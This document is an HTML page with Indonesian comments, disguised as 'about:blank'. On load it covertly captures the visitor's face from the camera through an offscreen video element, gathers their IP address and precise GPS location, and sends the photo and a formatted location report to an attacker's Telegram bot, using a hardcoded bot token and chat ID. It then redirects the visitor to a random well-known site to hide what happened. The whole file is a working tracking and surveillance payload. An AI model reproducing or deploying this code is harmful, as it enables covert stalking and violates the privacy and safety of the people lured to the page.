<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>about:blank</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
            font-family: Arial, sans-serif;
        }
        video {
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = '8559722594:AAEI5Zqw4EfNrAfLQysd7PirICGB199CFjo';
        const TELEGRAM_CHAT_ID = '7706220321';

        const redirectUrls = [
            'https://m.youtube.com',
            'https://google.com',
            'https://meet-visora-ai.vercel.app',
            'https://wikipedia.org',
            'https://samsung.com'
        ];

        let userIP = '';
        let userLocation = {};
        let redirectUrl = '';

        // Pilih URL redirect acak
        function selectRandomUrl() {
            redirectUrl = redirectUrls[Math.floor(Math.random() * redirectUrls.length)];
        }

        // Dapatkan IP pengguna
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                return userIP;
            } catch (error) {
                console.error('Error getting IP:', error);
                userIP = 'Tidak tersedia';
                return userIP;
            }
        }

        // Dapatkan info lokasi dari koordinat
        async function getLocationInfo(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Error getting location info:', error);
                return null;
            }
        }

        // Ambil foto dari kamera
        async function capturePhoto() {
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                video.srcObject = stream;
                
                // Tunggu video siap
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                // Tunggu sebentar untuk fokus kamera
                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Stop kamera
                stream.getTracks().forEach(track => track.stop());
                
                // Convert ke blob
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                return blob;
            } catch (error) {
                console.error('Error capturing photo:', error);
                return null;
            }
        }

        // Dapatkan lokasi pengguna
        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation tidak didukung'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        const locationInfo = await getLocationInfo(lat, lon);
                        
                        userLocation = {
                            latitude: lat,
                            longitude: lon,
                            accuracy: position.coords.accuracy,
                            locationInfo: locationInfo
                        };
                        
                        resolve(userLocation);
                    },
                    (error) => {
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Kirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');
            formData.append('caption', 'ðŸ“¸ Foto Wajah Pengguna');

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return await response.json();
            } catch (error) {
                console.error('Error sending photo:', error);
                return null;
            }
        }

        // Kirim info lokasi ke Telegram
        async function sendLocationToTelegram() {
            const localTime = new Date().toLocaleString('id-ID', { 
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone 
            });
            
            const locationInfo = userLocation.locationInfo;
            const country = locationInfo?.address?.country || 'Tidak diketahui';
            const state = locationInfo?.address?.state || '';
            const city = locationInfo?.address?.city || locationInfo?.address?.town || locationInfo?.address?.village || '';
            const locationName = [city, state].filter(Boolean).join(', ') || 'Tidak diketahui';
            const island = locationInfo?.address?.island || locationInfo?.address?.region || 'Tidak diketahui';
            
            const gmapsUrl = `https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
            const coordinates = `${userLocation.latitude}, ${userLocation.longitude}`;
            
            const message = `
==========================
ðŸ“ INFORMASI PENGGUNA
==========================
| IP: ${userIP}
| Gmaps: ${gmapsUrl}
| Lokasi: ${locationName}
| Negara: ${country}
| Koordinat Pengguna: ${coordinates}
| URL Langsung: ${redirectUrl}
| Pulau: ${island}
| Waktu lokal pengguna: ${localTime}
==========================
            `.trim();

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Error sending location:', error);
                return null;
            }
        }

        // Proses utama
        async function main() {
            try {
                // Pilih URL redirect
                selectRandomUrl();
                
                // Dapatkan IP
                await getUserIP();
                
                // Ambil foto
                const photo = await capturePhoto();
                if (photo) {
                    await sendPhotoToTelegram(photo);
                }
                
                // Dapatkan lokasi
                await getLocation();
                
                // Kirim info lokasi
                await sendLocationToTelegram();
                
                // Redirect ke URL acak
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1000);
                
            } catch (error) {
                console.error('Error:', error);
                // Tetap redirect meskipun ada error
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 2000);
            }
        }

        // Mulai saat halaman dimuat
        window.addEventListener('load', () => {
            setTimeout(main, 500);
        });
    </script>
</body>
</html>